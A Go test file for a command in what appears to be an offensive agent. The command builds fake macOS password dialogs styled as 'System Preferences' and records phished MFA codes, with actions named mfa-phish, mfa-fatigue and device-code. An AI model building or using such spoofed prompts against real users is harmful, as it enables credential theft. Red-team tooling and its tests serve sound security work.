package commands

import (
	"strings"
	"testing"
)

func TestEscapeAppleScriptClean(t *testing.T) {
	result := escapeAppleScript("Hello World")
	if result != "Hello World" {
		t.Errorf("expected unchanged string, got '%s'", result)
	}
}

func TestEscapeAppleScriptQuotes(t *testing.T) {
	result := escapeAppleScript(`He said "hello"`)
	if result != `He said \"hello\"` {
		t.Errorf("expected escaped quotes, got '%s'", result)
	}
}

func TestEscapeAppleScriptBackslash(t *testing.T) {
	result := escapeAppleScript(`path\to\file`)
	if result != `path\\to\\file` {
		t.Errorf("expected escaped backslashes, got '%s'", result)
	}
}

func TestEscapeAppleScriptBoth(t *testing.T) {
	result := escapeAppleScript(`C:\Users\"Admin"`)
	// Step 1: \ → \\ gives C:\\Users\\"Admin"
	// Step 2: " → \" gives C:\\Users\\\"Admin\"
	expected := `C:\\Users\\\"Admin\"`
	if result != expected {
		t.Errorf("expected '%s', got '%s'", expected, result)
	}
}

func TestEscapeAppleScriptEmpty(t *testing.T) {
	result := escapeAppleScript("")
	if result != "" {
		t.Errorf("expected empty string, got '%s'", result)
	}
}

func TestBuildCredPromptScriptBasic(t *testing.T) {
	result := buildCredPromptScript("System Preferences", "Enter your password", "caution")
	if !strings.Contains(result, "Enter your password") {
		t.Error("expected message in script")
	}
	if !strings.Contains(result, "System Preferences") {
		t.Error("expected title in script")
	}
	if !strings.Contains(result, "with hidden answer") {
		t.Error("expected hidden answer in script")
	}
	if !strings.Contains(result, "caution") {
		t.Error("expected icon in script")
	}
}

func TestBuildCredPromptScriptQuoteEscaping(t *testing.T) {
	result := buildCredPromptScript(`Title "quoted"`, `Message with "quotes"`, "stop")
	// After escaping, quotes should be preceded by backslash
	if !strings.Contains(result, `\"quoted\"`) {
		t.Errorf("expected escaped quotes in title, got: %s", result)
	}
	if !strings.Contains(result, `\"quotes\"`) {
		t.Errorf("expected escaped quotes in message, got: %s", result)
	}
}

func TestBuildCredPromptScriptContainsReturn(t *testing.T) {
	result := buildCredPromptScript("Title", "Message", "note")
	if !strings.Contains(result, "return theResult") {
		t.Error("expected return statement in script")
	}
}

func TestCredPromptExtractAction(t *testing.T) {
	tests := []struct {
		name   string
		params string
		want   string
	}{
		{"empty params", "", ""},
		{"no action", `{"title":"Test"}`, ""},
		{"dialog action", `{"action":"dialog"}`, "dialog"},
		{"device-code action", `{"action":"device-code"}`, "device-code"},
		{"mfa-phish action", `{"action":"mfa-phish"}`, "mfa-phish"},
		{"mfa-fatigue action", `{"action":"MFA-Fatigue"}`, "mfa-fatigue"},
		{"case insensitive", `{"action":"MFA-PHISH"}`, "mfa-phish"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := credPromptExtractAction(tt.params)
			if got != tt.want {
				t.Errorf("credPromptExtractAction(%q) = %q, want %q", tt.params, got, tt.want)
			}
		})
	}
}

func TestCredPromptMFAPhishResult(t *testing.T) {
	result := credPromptMFAPhishResult("123456", "Verify Identity", "testuser", "TestPlatform")

	if result.Status != "success" {
		t.Errorf("expected success status, got %s", result.Status)
	}
	if !result.Completed {
		t.Error("expected completed=true")
	}
	if !strings.Contains(result.Output, "Code:     123456") {
		t.Errorf("expected code in output, got: %s", result.Output)
	}
	if !strings.Contains(result.Output, "User:     testuser") {
		t.Errorf("expected user in output, got: %s", result.Output)
	}
	if !strings.Contains(result.Output, "MFA Phishing Result") {
		t.Errorf("expected MFA header in output, got: %s", result.Output)
	}
	if result.Credentials == nil || len(*result.Credentials) != 1 {
		t.Fatal("expected 1 credential")
	}
	cred := (*result.Credentials)[0]
	if cred.CredentialType != "plaintext" {
		t.Errorf("expected plaintext, got %s", cred.CredentialType)
	}
	if cred.Realm != "mfa-phish" {
		t.Errorf("expected mfa-phish realm, got %s", cred.Realm)
	}
	if cred.Credential != "123456" {
		t.Errorf("expected code as credential, got %s", cred.Credential)
	}
}

func TestCredPromptMFAPhishResultEmpty(t *testing.T) {
	result := credPromptMFAPhishResult("", "Title", "user", "Test")
	if !strings.Contains(result.Output, "empty code") {
		t.Errorf("expected empty code message, got: %s", result.Output)
	}
}
